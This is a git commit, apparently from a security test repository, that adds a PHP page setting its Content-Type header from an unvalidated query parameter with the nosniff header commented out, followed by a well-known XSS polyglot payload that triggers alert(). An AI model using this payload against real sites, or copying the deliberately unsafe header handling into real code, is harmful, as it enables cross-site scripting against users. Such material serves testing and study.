b2196beb96091586f1caf251b198e6a519fc0cbf
Prakash Sharma <prakashsharma97@hotmail.com>
2017-09-21 08:34:45 +0545

    XSS Polyglot

---
+++ alert.php
@@ -0,0 +1,7 @@
+<?php
+  $type = !isset($_GET['type']) ? 'text/html' : $_GET['type'];
+  header("Content-Type: ".$type."; charset=utf-8");
+  //header("X-Content-Type-Options: nosniff");
+?>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
